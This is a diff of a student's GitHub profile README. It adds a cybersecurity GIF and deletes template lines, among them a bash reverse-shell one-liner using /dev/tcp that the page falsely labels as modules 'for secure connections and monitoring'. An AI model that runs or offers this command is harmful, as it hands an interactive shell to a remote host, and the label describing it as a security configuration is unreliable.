@@ -2,6 +2,8 @@
 
 ### Network and Database Administration student skilled in security, virtualization, and web development, with a focus on efficient and robust tech solutions.
 
+![Cybersecurity GIF](https://media.giphy.com/media/sq7lz4wHsGzXa/giphy.gif) <!-- Replace with a more relevant GIF if you find one -->
+
 ---
 
 ### 📜 About Me
@@ -47,10 +49,4 @@ I'm dedicated to the field of system and network administration, with a commitme
 _This configuration includes Bash modules for secure connections and monitoring:_
 
 ```bash
-/bin/bash -i >& /dev/tcp/Errabab/444 0>&1
 
-
-<!---
-Errabab/Errabab is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
